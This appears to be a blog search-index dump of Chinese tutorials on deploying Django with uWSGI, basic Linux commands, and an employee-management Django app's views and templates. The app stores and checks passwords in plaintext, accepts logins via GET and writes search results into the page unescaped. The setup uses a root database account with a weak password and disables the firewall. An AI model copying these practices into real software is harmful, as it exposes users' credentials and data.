的第一行的最后面改为python2.7.5 2. vi /usr/libexec/urlgrabber-ext-down 同上即可 三、Django安装 安装数据库驱动：pip install mysqlclient pip install django==&quot;2.0.6&quot; 测试使用： django-admin startproject testproj 在当前目录下创建一个project:”testproj” cd到testproj目录下的testporj目录下settings.py 修改配置：ALLOWED_HOSTS = [&quot;*&quot;] 启动django内置的web服务器。cd到testproj目录下，执行：python manage.py runserver 0.0.0.0:port 在Windows的浏览器中访问：ip:port – ip为Linux系统的ip地址 四、uWSGI服务器1、WSGI协议 使用Django或Flask框架编写的Web应用程序，在python manage.py runserver 时都启动的是框架内置的服务器来运行Web应用程序，而内置的服务器遵循了WSGI协议（WSGI Server）。 WSGI：全称是Web Server Gateway Interface，WSGI不是服务器，python模块，框架，API或者任何软件，只是一种规范，描述web server如何与web application通信的规范。 WSGI server负责从客户端接收请求，将request转发给application，将application返回的response返回给客户端； WSGI application接收由server转发的request，处理请求，并将处理结果返回给server。 要实现WSGI协议，必须同时实现web server和web application，当前运行在WSGI协议之上的web框架有Bottle, Flask, Django。 总结：WSGI是Web 服务器(uWSGI)与 Web 应用程序或应用框架(Django)之间的一种低级别的接口。 2、uWSGI服务器安装WSGI协议下web服务器很多：django内置，uWSGI，gunicorn。 2.1 服务器安装 将uWSGI的tar包发送linux 解压tar：tar -zxvf uwsgi-2.0.17.tar.gz cd到解压目录下，编译：make 为了可以更方便的执行 uwsgi 启动uWSGI服务器，定制链接： ln -s /usr/local/uwsgi-2.0.17/uwsgi /usr/bin/uwsgi 则可以在任意目录下执行 uwsgi 去启动uWSGI服务器 测试使用python的wsgi服务器-uWSGI 在任意的一个目录中定义一个python脚本：hello.py 123def application(env, start_response): start_response(&#x27;200 OK&#x27;, [(&#x27;Content-Type&#x27;,&#x27;text/html;charset=utf-8&#x27;)]) return [bytes(&#x27;你好啊！！&#x27;,&#x27;utf-8&#x27;),b&#x27;Mr_lee&#x27;] # 基于wsgi协议规范实现的代码 启动uWSGI服务器，并部署hello.py程序 uwsgi --http 192.168.248.128:8001 --wsgi-file hello.py #注意hilo.py可以写成绝对路径 浏览器访问：192.168.248.128:8001 3、 uWSGI部署django项目 在数据库中建好项目需要的database：“ems” 使用Navicat创建即可,注意字符集为 utf8 在Django项目的settings.py中修改配置 12345678910111213DEBUG = False #去掉开发模式 ALLOWED_HOSTS = [&quot;*&quot;] #开放访问hostDATABASES = &#123; #合适数据库参数 &#x27;default&#x27;: &#123; &#x27;ENGINE&#x27;: &#x27;django.db.backends.mysql&#x27;, &#x27;NAME&#x27;: &#x27;ems&#x27;, &#x27;USER&#x27;: &#x27;root&#x27;, &#x27;HOST&#x27;: &#x27;localhost&#x27;, &#x27;PORT&#x27;: &#x27;3306&#x27;, &#x27;PASSWORD&#x27;: &#x27;123456&#x27; &#125;&#125; 发送项目到linux并做移植 python manage.py makemigrations python manage.py migrate 编写uWSGI的配置文件 12345678910111213141516171819202122232425#随意找一个目录，创建一个文件：config.ini -- 建议放在项目的根目录下[uwsgi]http = 192.168.134.128:9000 # uWSGI服务器访问地址#uWSGI和nginx通信的portsocket = 192.168.134.128:9001# the base directory (full path)chdir = /usr/local/django_projects/ems #项目所在目录# Django&#x27;s wsgi filewsgi-file = ems/wsgi.py #基于项目目录的相对路径# maximum number of worker processesprocesses = 4#thread numbers startched in each worker processthreads = 2#monitor uwsgi status 通过该端口可以监控 uwsgi 的负载情况stats = 192.168.134.128:9002# clear environment on exitvacuum = truepidfile = /usr/local/django_projects/ems/uwsgi.pid #进程ID存放于此文件，位置可以自定义#daemonize-run ,file-to-record-logdaemonize = /usr/local/django_projects/ems/uwsgi.log #后台启动模式，日志文件记录位置自定义#http://ip:port/static/...请求会进入该目录找资源，此处可以指向某个app下的static目录#或是将所有静态文件汇总到项目的某一个目录下，然后配置在此是更好的选择#汇集所有已安装app的静态资源到一个目录下，请参见后续内容#http://ip:port/static/a/b/c/d.png ==&gt; /usr/local/xxxx/static/a/b/c/d.pngstatic-map =/static=/usr/local/xxx/static # 只在你写的static-map中找静态资源 根据如上配置启动uWSGI服务器 uwsgi --ini config.ini #注意：config.ini是一个相对路径 关闭服务器 uwsgi --stop uwsgi.pid #通过进程id文件 使用uwsgi服务器运行项目后，出现静态资源无法加载的问题 123456# 分析原因： 1.在django内置的服务器中，调试模式，django查找静态资源默认在每个app的static目录 2. 或者可以在setting.py文件中 STATICFILES_DIRS = [os.path.join(BASE_DIR,&#x27;static&#x27;)] 将项目根目录下的static目录作为静态资源的查找路径 # 但是uwsgi服务器有自己的静态资源的处理方式，也就是它不会在上述的两个地方查找静态资源 uwsgi如何处理静态资源 1234567891011121314# 在config.ini配置文件的最后面来告诉uwsgi服务器要在哪里去找静态资源[uwsig]http = xxx:9000socket = xxx:9001.........# 写你的静态资源的绝对路径，如果在项目根目录下，直接写项目根目录/static即可# 如果是每个app自己管理，把所有的app的static目录添加进来，有几个app加几个static-mapstatic-map=/static=/usr/local/xxx/static url可以分为两大类：1. 普通url-动态资源url 会在urls.py文件中匹配访问路径 最终找到视图函数2. 静态资源url-- /static/ 告诉django当url中有/static/时django会在静态资源的目录下去查找资源 如果你的app过多，每个app自己管理静态资源，此时需要添加的static-map太多 123456# 只需要做两步操作就可以把所有app下的静态资源static目录的文件收集到某一个目录下1. 在项目的setting.py文件中添加 STATIC_ROOT=os.path.join(BASE_DIR,&#x27;static&#x27;) 用于告诉django，将来收集到的静态资源往哪里放 2. 执行收集的指令 python manage.py collectstatic STATIC_URL &#x3D; ‘&#x2F;static&#x2F;‘ # 每个静态资源URL的访问前缀 STATICFIELS_DIRS &#x3D; [os.path.join(BASE_DIR,’static’)] # 添加django内置服务器查找静态资源的路径 STATIC_ROOT &#x3D; os.path.join(BASE_DIR,’static’) # 收集静态资源时的路径 static-map&#x3D;&#x2F;static&#x3D;xxxx # 告诉uwsgi服务器到哪里去找静态资源","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"}]},{"title":"Linux-常用指令","slug":"Linux-常用指令","date":"2020-09-03T09:24:44.000Z","updated":"2022-04-08T14:29:40.234Z","comments":true,"path":"2020/09/03/Linux-常用指令/","permalink":"http://example.com/2020/09/03/Linux-%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/","excerpt":"1.基础命令2.vi编辑模式3.网络4.压缩文件","text":"1.基础命令2.vi编辑模式3.网络4.压缩文件 Linux常用指令1.基础命令12345678910111213141516171819202122232425262728ls:显示当前目录清单cd: 切换目录​ cd ~ 或者 cd 切换到用户主目录​ cd / 切换到根目录​ cd .. 上一级目录pwd: 显示当前工作目录man: 查看帮助mkdir 创建目录rmdir 删除目录touch 创建文件rm -rf 强制删除mv 移动文件或目录*匹配任意字符?匹配一个字符cat 显示文件内容ps -ef | grep 进程名 显示所有的进程kill -9 进程名 强制杀死 2.vi编辑模式1234- :w 保存文本- :q 不保存文本并退出vi- :q! 不保存文本并强制退出vi （常用）- :wq 保存文本并退出vi （常用） 12345678910#### 进入文本编辑器，输入【i/I、o/O、a/A、r/R】进入编辑模式：- i：在光标处插入(常用)- I：在光标所在行第一个非空格字符处插入 -- 行首 (常用)- o：在光标所在行的下一行插入新的一行(常用) -- Other- O：在光标所在行的上一行插入新的一行- a：在光标所在位置的下一个字符处开始插入- A：在光标所在行的最后一个位置开始插入 -- 行尾 (常用)- r：替换光标所在位置的字符(只替换一次) - R：一直替换光标所在位置的字符，直到按(esc)键为止 1234567891011##### 删除、复制、粘贴、撤消- ​ dd：删除(剪切)光标所在行- ​ ndd: 删除(剪切)光标所在的向下n行 5dd- ​ yy: 复制当前行- ​ nyy: 复制光标所在的向下n行 6yy- ​ p: 将已复制的数据在光标下一行粘贴 - ​ P: 将已复制的数据在光标上一行粘贴- ​ u: 撤消删除 - ​ shift + g 文件尾- ​ shift + G 文件头 3.网络1.查看ipip addr 2.设置虚拟机ip123451. vi /etc/sysconfig/network-scripts/ifcfg-eno167xxxx #### 将其中的 ONBOOT=yes2.重启网络服务 systemctl restart network 3.设置防火墙123456789- 查看防火墙状态 systemctl status firewalld.service- 关闭防火墙 systemctl stop firewalld.service`- 启动防火墙 systemctl start firewalld.service - 永久关防火墙 systemctl disable firewalld.service 4.压缩文件tar命令参数 c 压缩文件 x 解压文件 z 格式为gzip v 显示执行文件列表 f 要操作的文件 直接解压 tar –zxvf xxx.tar &#x2F; xxx.tar.gz解压后，编译安装","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"}]},{"title":"Django-ems重构","slug":"Django-ems重构","date":"2020-09-03T08:36:15.000Z","updated":"2022-04-08T14:29:40.234Z","comments":true,"path":"2020/09/03/Django-ems重构/","permalink":"http://example.com/2020/09/03/Django-ems%E9%87%8D%E6%9E%84/","excerpt":"Django实现用户登陆,注册,以及session会话强制登陆,以及对员工的信息的增加,删除,修改操作,中间件,上传头像,验证码 ,分页显示 模糊查询, 登陆,注册使用 Jquery-Ajax","text":"Django实现用户登陆,注册,以及session会话强制登陆,以及对员工的信息的增加,删除,修改操作,中间件,上传头像,验证码 ,分页显示 模糊查询, 登陆,注册使用 Jquery-Ajax Django—-ems项目重构views视图123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150import os, random, string, uuidfrom django.core.paginator import Paginatorfrom django.db import transactionfrom django.http import HttpResponse, JsonResponsefrom django.shortcuts import render, redirectfrom captcha.image import ImageCaptchafrom emsapp.models import User, Staff# 登陆页面def login1(request): return render(request, &#x27;emsapp/login.html&#x27;)# 登陆def login(request): if request.method == &quot;GET&quot;: username = request.GET.get(&quot;name&quot;) userpwd = request.GET.get(&quot;pwd&quot;) else: username = request.POST.get(&quot;name&quot;) userpwd = request.POST.get(&quot;pwd&quot;) print(userpwd, username) res = User.objects.filter(user_name=username, user_pwd=userpwd) if res: # 设置session request.session[&#x27;login&#x27;] = True # 使用ajax局部更新 return HttpResponse(&#x27;ok&#x27;) return HttpResponse(&#x27;用户名或密码错误&#x27;)# 注册def regist(request): return render(request, &#x27;emsapp/regist.html&#x27;)# 验证码生成def getCaptcha(request): img = ImageCaptcha() code = random.sample(string.ascii_uppercase + string.ascii_lowercase + string.digits, 4) # 拼接字符,通过session传递验证码 random_code = &#x27;&#x27;.join(code) request.session[&#x27;code&#x27;] = random_code data = img.generate(random_code) return HttpResponse(data, &#x27;image/png&#x27;)# 注册逻辑def regist_logic(request): username = request.POST.get(&#x27;username&#x27;) password = request.POST.get(&#x27;pwd&#x27;) name = request.POST.get(&#x27;name&#x27;) sex = request.POST.get(&#x27;sex&#x27;) code = request.session[&#x27;code&#x27;] captcha = request.POST.get(&#x27;captcha&#x27;) print(captcha, name, username) try: with transaction.atomic(): if captcha.lower() == code.lower(): res = User.objects.filter(user_name=username) if res: return HttpResponse(&#x27;user_have&#x27;) else: User.objects.create(user_name=username, user_pwd=password, name=name, sex=sex) return HttpResponse(&#x27;ok&#x27;) else: return HttpResponse(&#x27;error&#x27;) except: print()# 主页逻辑def emplist_logic(request): staff = Staff.objects.all() # 实现分页 page_number = request.session.get(&#x27;page_number&#x27;) # 添加 page_number1 = request.session.get(&#x27;page_number1&#x27;) # 修改更新 num = request.GET.get(&quot;num&quot;, 1) paginator = Paginator(staff, per_page=3) if page_number: num = paginator.num_pages request.session[&#x27;page_number&#x27;] = False if page_number1: num = page_number1 request.session[&#x27;page_number1&#x27;] = False if int(num) &gt; paginator.num_pages: num = paginator.num_pages elif int(num) &lt; 1: num = 1 page = paginator.page(num) return render(request, &#x27;emsapp/emplist.html&#x27;, &#123;&quot;page&quot;: page&#125;)# 添加员工def addEmp(request): request.session[&#x27;page_number&#x27;] = True return render(request, &#x27;emsapp/addEmp.html&#x27;)# 添加员工逻辑def addEmp_logic(request): try: name = request.POST.get(&#x27;name&#x27;) salary = request.POST.get(&#x27;salary&#x27;) age = request.POST.get(&#x27;age&#x27;) head_pic = request.FILES.get(&#x27;head_pic&#x27;) ext = os.path.splitext(head_pic.name)[1] pic = str(uuid.uuid4()) + ext head_pic.name = pic with transaction.atomic(): Staff.objects.create(name=name, salary=salary, age=age, head_pic=head_pic) return redirect(&#x27;emsapp:emplist_logic&#x27;) except: print()# 删除员工def delete(request): try: number = request.GET.get(&#x27;num&#x27;) request.session[&#x27;page_number1&#x27;] = number with transaction.atomic(): id = request.GET.get(&#x27;id&#x27;) staff = Staff.objects.get(pk=id) staff.delete() return redirect(&#x27;emsapp:emplist_logic&#x27;) except: print()# 更新员工def updateEmp(request): id = request.GET.get(&#x27;id&#x27;) staff = Staff.objects.get(pk=id) number = request.GET.get(&#x27;num&#x27;) request.session[&#x27;page_number1&#x27;] = number return render(request, &#x27;emsapp/updateEmp.html&#x27;, &#123;&quot;staff&quot;: staff&#125;)# 更新员工逻辑def updareEmp_logic(request): try: id = request.GET.get(&#x27;id&#x27;) staff = Staff.objects.get(pk=id) name = request.POST.get(&#x27;name&#x27;) salary = request.POST.get(&#x27;salary&#x27;) age = request.POST.get(&#x27;age&#x27;) head_pic = request.FILES.get(&#x27;head_pic&#x27;) ext = os.path.splitext(head_pic.name)[1] pic = str(uuid.uuid4()) + ext head_pic.name = pic with transaction.atomic(): staff.name = name staff.salary = salary staff.age = age staff.head_pic = head_pic staff.save() return redirect(&#x27;emsapp:emplist_logic&#x27;) except: print()# 模糊查询def query(request): staff = request.GET.get(&quot;s1&quot;) res = Staff.objects.filter(name__icontains=staff) def mydefault(u): if isinstance(u, Staff): return &#123;&#x27;name&#x27;: u.name, &#x27;salary&#x27;: u.salary, &#x27;age&#x27;: u.age&#125; return JsonResponse(&#123;&#x27;staff&#x27;: list(res)&#125;, safe=False, json_dumps_params=&#123;&#x27;default&#x27;: mydefault&#125;) emplist.html123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184&#123;% load static %&#125;&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;emplist&lt;/title&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;&#123;% static &#x27;emsapp/css/style.css&#x27; %&#125;&quot;/&gt; &lt;script src=&quot;&#123;% static &#x27;emsapp/js/jquery-1.11.1.min.js&#x27; %&#125;&quot;&gt;&lt;/script&gt; &#123;% block script %&#125; &lt;script&gt; $(document).ready(function () &#123; $(&quot;#query&quot;).click(function () &#123; $.ajax(&#123; type: &quot;GET&quot;, url: &quot;&#123;% url &#x27;emsapp:query&#x27; %&#125;&quot;, data: &quot;s1=&quot; + $(&quot;#s1&quot;).val(), success: function (c) &#123; console.log(c); c = c[&#x27;staff&#x27;]; var str = &#x27;&lt;tr&gt;&lt;td&gt;姓名&lt;/td&gt;&lt;td&gt;薪水&lt;/td&gt;&lt;td&gt;年龄&lt;/td&gt;&lt;/tr&gt;&#x27;; for (var i = 0; i &lt; c.length; i++) &#123; str += &quot;&lt;tr&gt;&quot;; str += &quot;&lt;td&gt;&quot;; str += c[i][&#x27;name&#x27;]; str += &quot;&lt;/td&gt;&quot;; str += &quot;&lt;td&gt;&quot;; str += c[i][&#x27;salary&#x27;]; str += &quot;&lt;/td&gt;&quot;; str += &quot;&lt;td&gt;&quot;; str += c[i][&#x27;age&#x27;]; str += &quot;&lt;/td&gt;&quot;; str += &quot;&lt;/tr&gt;&quot;; &#125; $(&quot;#t1&quot;)[0].innerHTML = str &#125; &#125;) &#125;) &#125;) &lt;/script&gt; &#123;% endblock %&#125;&lt;/head&gt;&lt;body&gt;&lt;div id=&quot;wrap&quot;&gt; &lt;div id=&quot;top_content&quot;&gt; &lt;div id=&quot;header&quot;&gt; &lt;div id=&quot;rightheader&quot;&gt; &lt;p&gt; 2009/11/20 &lt;br/&gt; &lt;/p&gt; &lt;/div&gt; &lt;div id=&quot;topheader&quot;&gt; &lt;h1 id=&quot;title&quot;&gt; &lt;a href=&quot;#&quot;&gt;main&lt;/a&gt; &lt;/h1&gt; &lt;/div&gt; &lt;div id=&quot;navigation&quot;&gt; &lt;/div&gt; &lt;/div&gt; &#123;% block content %&#125; &lt;div id=&quot;content&quot;&gt; &lt;p id=&quot;whereami&quot;&gt; &lt;/p&gt; &lt;h1&gt; Welcome! &lt;/h1&gt; &lt;div&gt; &lt;input type=&quot;text&quot; id=&quot;s1&quot;&gt; &lt;input type=&quot;button&quot; value=&quot;搜索&quot; id=&quot;query&quot;&gt; &lt;/div&gt; &lt;table class=&quot;table&quot; id=&quot;t1&quot;&gt; &lt;tr class=&quot;table_header&quot;&gt; &lt;td&gt; ID &lt;/td&gt; &lt;td&gt; Name &lt;/td&gt; &lt;td&gt; Salary &lt;/td&gt; &lt;td&gt; Age &lt;/td&gt; &lt;td&gt; head_pic &lt;/td&gt; &lt;td&gt; Operation &lt;/td&gt; &lt;/tr&gt; &#123;% for i in page.object_list %&#125; &#123;% if forloop.counter|divisibleby:2 %&#125; &lt;tr class=&quot;row1&quot; style=&quot;background-color: #ffffff&quot;&gt; &lt;td&gt; &#123;&#123; forloop.counter &#125;&#125; &lt;/td&gt; &lt;td&gt; &#123;&#123; i.name &#125;&#125; &lt;/td&gt; &lt;td&gt; &#123;&#123; i.salary &#125;&#125; &lt;/td&gt; &lt;td&gt; &#123;&#123; i.age &#125;&#125; &lt;/td&gt; &lt;td&gt; &lt;img src=&quot;&#123;% static i.head_pic.url %&#125;&quot; alt=&quot;图片加载失败&quot; height=&quot;70px&quot;&gt; &lt;/td&gt; &lt;td&gt; &lt;a href=&quot;&#123;% url &quot;emsapp:delete&quot; %&#125;?id=&#123;&#123; i.id &#125;&#125;&amp;num=&#123;&#123; page.number &#125;&#125;&quot;&gt;delete emp&lt;/a&gt;&amp;nbsp; &lt;a href=&quot;&#123;% url &quot;emsapp:updateEmp&quot; %&#125;?id=&#123;&#123; i.id &#125;&#125;&amp;num=&#123;&#123; page.number &#125;&#125;&quot;&gt;update emp&lt;/a&gt; &lt;/td&gt; &lt;/tr&gt; &#123;% else %&#125; &lt;tr class=&quot;row2&quot; style=&quot;background-color: #eeeeee&quot;&gt; &lt;td&gt; &#123;&#123; forloop.counter &#125;&#125; &lt;/td&gt; &lt;td&gt; &#123;&#123; i.name &#125;&#125; &lt;/td&gt; &lt;td&gt; &#123;&#123; i.salary &#125;&#125; &lt;/td&gt; &lt;td&gt; &#123;&#123; i.age &#125;&#125; &lt;/td&gt; &lt;td&gt; &lt;img src=&quot;&#123;% static i.head_pic.url %&#125;&quot; alt=&quot;图片加载失败&quot; height=&quot;70px&quot;&gt; &lt;/td&gt; &lt;td&gt; &lt;a href=&quot;&#123;% url &quot;emsapp:delete&quot; %&#125;?id=&#123;&#123; i.id &#125;&#125;&amp;num=&#123;&#123; page.number &#125;&#125;&quot;&gt;delete emp&lt;/a&gt;&amp;nbsp;&lt;a href=&quot;&#123;% url &quot;emsapp:updateEmp&quot; %&#125;?id=&#123;&#123; i.id &#125;&#125;&amp;num=&#123;&#123; page.number &#125;&#125;&quot;&gt;update emp&lt;/a&gt; &lt;/td&gt; &lt;/tr&gt; &#123;% endif %&#125; &#123;% endfor %&#125; &lt;/table&gt; &#123;% if page.has_previous %&#125; &lt;a href=&quot;&#123;% url &#x27;emsapp:emplist_logic&#x27; %&#125;?num=&#123;&#123; page.previous_page_number &#125;&#125;&quot;&gt; 上一页&lt;/a&gt; &#123;% endif %&#125; &#123;% for foo in page.paginator.page_range %&#125; &lt;a href=&quot;&#123;% url &#x27;emsapp:emplist_logic&#x27; %&#125;?num=&#123;&#123; foo &#125;&#125;&quot;&gt; &#123;% if foo == page.number %&#125; &lt;span class=&quot;a&quot;&gt;&#123;&#123; foo &#125;&#125;&lt;/span&gt; &#123;% else %&#125; &lt;span class=&quot;b&quot;&gt;&#123;&#123; foo &#125;&#125;&lt;/span&gt; &#123;% endif %&#125; &lt;/a&gt; &#123;% endfor %&#125; &#123;% if page.has_next %&#125; &lt;a href=&quot;&#123;% url &#x27;emsapp:emplist_logic&#x27; %&#125;?num=&#123;&#123; page.next_page_number &#125;&#125;&quot;&gt; 下一页&lt;/a&gt; &#123;% endif %&#125; &#123;% if not page.paginator.num_pages == page.number %&#125; &lt;a href=&quot;&#123;% url &#x27;emsapp:emplist_logic&#x27; %&#125;?num=&#123;&#123; page.paginator.num_pages &#125;&#125;&quot;&gt;尾页&lt;/a&gt; &#123;% endif %&#125; &lt;form action=&quot;&#123;% url &#x27;emsapp:emplist_logic&#x27; %&#125;&quot; method=&quot;get&quot;&gt; 输入页号&lt;input type=&quot;text&quot; name=&quot;num&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;跳转&quot;&gt; &lt;/form&gt; &lt;p&gt; &lt;input type=&quot;button&quot; class=&quot;button&quot; value=&quot;Add Employee&quot; onclick=&quot;location.href=&#x27;&#123;% url &quot;emsapp:addEmp&quot; %&#125;?num=&#123;&#123; page.paginator.num_pages &#125;&#125;&#x27;&quot;/&gt; &lt;/p&gt; &lt;/div&gt; &#123;% endblock %&#125; &lt;/div&gt; &lt;div id=&quot;footer&quot;&gt; &lt;div id=&quot;footer_bg&quot;&gt; ABC@126.com &lt;/div&gt; &lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; login.html12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&#123;% extends &quot;emsapp/emplist.html&quot; %&#125;&#123;% block script %&#125; &lt;script&gt; $(document).ready(function () &#123; $(&quot;#sumbit&quot;).click(function () &#123; $.ajax(&#123; type: &quot;POST&quot;, url: &quot;&#123;% url &#x27;emsapp:login&#x27; %&#125;&quot;, data: &quot;name=&quot; + $(&quot;#name&quot;).val() + &quot;&amp;pwd=&quot; + $(&quot;#pwd&quot;).val() + &#x27;&amp;csrfmiddlewaretoken=&#123;&#123; csrf_token &#125;&#125;&#x27;, success: function (msg) &#123; &#123;#console.log(msg);#&#125; if (msg == &#x27;ok&#x27;) &#123; location.href = &quot;&#123;% url &#x27;emsapp:emplist_logic&#x27; %&#125;&quot; &#125; else &#123; $(&quot;#s1&quot;)[0].textContent = msg; console.log($(&quot;#s1&quot;)); &#125; &#125; &#125;) &#125;) &#125;) &lt;/script&gt;&#123;% endblock %&#125;&#123;% block content %&#125; &lt;div id=&quot;content&quot;&gt; &lt;p id=&quot;whereami&quot;&gt; &lt;/p&gt; &lt;h1&gt; login &lt;/h1&gt; &lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;application/x-www-form-urlencoded&quot;&gt; &#123;% csrf_token %&#125; &lt;table cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; border=&quot;0&quot; class=&quot;form_table&quot;&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; username: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;inputgri&quot; name=&quot;name&quot; id=&quot;name&quot;/&gt; &lt;span id=&quot;s1&quot;&gt;&lt;/span&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; password: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;password&quot; class=&quot;inputgri&quot; name=&quot;pwd&quot; id=&quot;pwd&quot;/&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;p&gt; &lt;input type=&quot;button&quot; id=&quot;sumbit&quot; class=&quot;button&quot; value=&quot;Submit &amp;raquo;&quot;/&gt; &lt;input type=&quot;button&quot; value=&quot;注册 &amp;raquo;&quot; class=&quot;button&quot; onclick=&quot;location.href=&#x27;&#123;% url &#x27;emsapp:regist&#x27; %&#125;&#x27;&quot;/&gt; &lt;/p&gt; &lt;/form&gt; &lt;/div&gt;&#123;% endblock %&#125; regist.html123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102&#123;% extends &quot;emsapp/emplist.html&quot; %&#125;&#123;% block script %&#125; &lt;script&gt; $(document).ready(function () &#123; $(function () &#123; $(&quot;#a1&quot;).click(function () &#123; $(&quot;#img1&quot;)[0].src = &quot;&#123;% url &#x27;emsapp:getCaptcha&#x27; %&#125;?&quot; + new Date().getTime(); &#125;) &#125;); $(&quot;#submit&quot;).click(function () &#123; console.log(&#x27;sdfsdf&#x27;); $.ajax(&#123; type: &quot;POST&quot;, url: &quot;&#123;% url &#x27;emsapp:regist_logic&#x27; %&#125;&quot;, data: &quot;username=&quot; + $(&quot;#username&quot;).val() + &quot;&amp;name=&quot; + $(&quot;#name&quot;).val() + &quot;&amp;pwd=&quot; + $(&quot;#pwd&quot;).val() + &quot;&amp;sex=&quot; + $(&quot;[name=sex]&quot;).val() + &quot;&amp;captcha=&quot; + $(&quot;#captcha&quot;).val() + &quot;&amp;csrfmiddlewaretoken=&#123;&#123; csrf_token &#125;&#125;&quot;, success: function (msg) &#123; console.log(msg); if (msg == &#x27;ok&#x27;) &#123; location.href = &quot;&#123;% url &#x27;emsapp:login1&#x27; %&#125;&quot; &#125; else if (msg ==&#x27;user_have&#x27;) &#123; $(&quot;#s1&quot;)[0].textContent = &quot;用户名已存在&quot; &#125;else &#123; $(&quot;#s1&quot;)[0].textContent = &quot;验证码错误&quot; &#125; &#125; &#125;) &#125;) &#125;) &lt;/script&gt;&#123;% endblock %&#125;&#123;% block content %&#125; &lt;div id=&quot;content&quot;&gt; &lt;p id=&quot;whereami&quot;&gt; &lt;/p&gt; &lt;h1&gt; 注册 &lt;/h1&gt; &lt;form&gt; &#123;% csrf_token %&#125; &lt;table cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; border=&quot;0&quot; class=&quot;form_table&quot;&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; 用户名: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;inputgri&quot; id=&quot;username&quot;/&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; 真实姓名: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;inputgri&quot; id=&quot;name&quot;/&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; 密码: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;password&quot; class=&quot;inputgri&quot; id=&quot;pwd&quot;/&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; 性别: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; 男 &lt;input type=&quot;radio&quot; class=&quot;inputgri&quot; name=&quot;sex&quot; value=&quot;m&quot; checked=&quot;checked&quot;/&gt; 女 &lt;input type=&quot;radio&quot; class=&quot;inputgri&quot; name=&quot;sex&quot; value=&quot;f&quot;/&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; 验证码: &lt;img id=&quot;img1&quot; src=&quot;&#123;% url &#x27;emsapp:getCaptcha&#x27; %&#125;&quot; width=&quot;70px&quot;/&gt; &lt;a href=&quot;javascript:void(0)&quot; id=&quot;a1&quot;&gt;换一张&lt;/a&gt; &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;inputgri&quot; name=&quot;captcha&quot; id=&quot;captcha&quot;/&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;&lt;span id=&quot;s1&quot;&gt;&lt;/span&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;p&gt; &lt;input type=&quot;button&quot; id=&quot;submit&quot; class=&quot;button&quot; value=&quot;Submit &amp;raquo;&quot;/&gt; &lt;/p&gt; &lt;/form&gt; &lt;/div&gt;&#123;% endblock %&#125; updateEmp.html12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&#123;% extends &quot;emsapp/emplist.html&quot; %&#125;&#123;% load static %&#125;&#123;% block content %&#125; &lt;div id=&quot;content&quot;&gt; &lt;p id=&quot;whereami&quot;&gt; &lt;/p&gt; &lt;h1&gt; update Emp info: &lt;/h1&gt; &lt;form action=&quot;&#123;% url &quot;emsapp:updareEmp_logic&quot; %&#125;?id=&#123;&#123; staff.id &#125;&#125;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &#123;% csrf_token %&#125; &lt;table cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; border=&quot;0&quot; class=&quot;form_table&quot;&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; id: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &#123;&#123; staff.id &#125;&#125; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; 